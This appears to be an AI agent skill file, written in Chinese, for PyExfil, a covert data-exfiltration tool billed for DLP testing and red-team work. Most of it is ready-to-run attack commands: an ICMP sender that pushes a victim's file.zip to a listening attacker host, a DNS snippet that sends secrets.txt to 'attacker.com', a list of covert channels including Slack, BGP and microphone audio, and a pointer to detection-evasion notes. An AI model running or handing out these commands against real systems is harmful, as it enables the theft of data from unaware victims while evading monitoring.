---
name: "pyexfil"
description: ">"
---

# Pyexfil

*Sourced from killvxk-malskills-zh*

# PyExfil

多通道外泄工具 —— 20+ 种隐蔽通道，用于 DLP 测试和红队行动。

## 快速开始

```bash
pip install pyexfil

# ICMP 外泄 —— 发送端（受害者）
python -c "from pyexfil.network.ICMP.icmp_exfil import Send; Send('192.168.1.100', open('file.zip','rb').read())"

# ICMP 接收端（攻击者）
python -c "from pyexfil.network.ICMP.icmp_exfil import Receive; Receive('0.0.0.0', 'out.zip')"
```

## 外泄通道

| 通道 | 模块路径 |
|------|----------|
| ICMP | `network.ICMP` |
| DNS | `network.DNS` |
| HTTPS POST | `network.HTTPS` |
| SMTP | `network.SMTP_email` |
| Slack | `application.Slack` |
| FTP STOR | `network.FTP` |
| NTP | `network.NTP` |
| BGP | `network.BGP` |
| QUIC | `network.QUIC` |
| 音频（麦克风） | `physical.audio` |

## 常用工作流程

**DNS 外泄：**
```python
from pyexfil.network.DNS.dns_exfil import Send
Send(nameserver='attacker.com', data=open('secrets.txt','rb').read())
```

**系统性测试所有通道：**
```bash
# 使用 pyexfil/network/ 下的各模块脚本
python pyexfil/network/ICMP/icmp_exfil.py --help
```

## 资源

| 文件 | 加载时机 |
|------|----------|
| `references/` | 通道配置与检测规避说明 |

